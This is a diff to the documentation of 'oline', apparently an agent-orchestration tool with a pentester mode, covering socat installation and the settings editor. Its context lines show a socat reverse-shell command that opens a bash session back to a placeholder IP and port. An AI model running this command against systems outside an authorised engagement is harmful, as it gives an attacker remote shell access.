@@ -180,7 +180,8 @@ back with, for example:
 socat tcp:<your-ip>:<port> exec:'bash -li',pty,stderr,setsid,sigint,sane
 ```
 
-`socat` must be installed in the sandbox.
+This needs `socat` in the sandbox. In pentester mode oline installs it at startup
+if it is missing (best effort); otherwise install it yourself.
 
 When an agent opens a `revshell` channel it appears as a `⇄` row (name and port);
 click it to open a pane that streams the channel and sends what you type to the
@@ -202,8 +203,8 @@ arrows, PgUp, PgDn, and the wheel scroll, Esc exits.
 ### Settings editor
 
 `Ctrl-b e` lists scope, a `tui` settings item, the model tiers, providers, and every
-agent plus the orchestrator's `system prompt` / `personality` / (pentester)
-`methodology`. Enter edits an item; `Tab` and `↑/↓` move between fields and the prompt
+agent plus the orchestrator's `system prompt` / `personality`. Enter edits an item;
+`Tab` and `↑/↓` move between fields and the prompt
 box, `alt+↑/↓` resize it, `Ctrl+S` saves. Editing **scope** live re-applies the
 firewall and notifies the orchestrator. The **customizable panes** setting, off by
 default, drops the fixed tabs and auto-layout for free-form numeric tabs (applies next
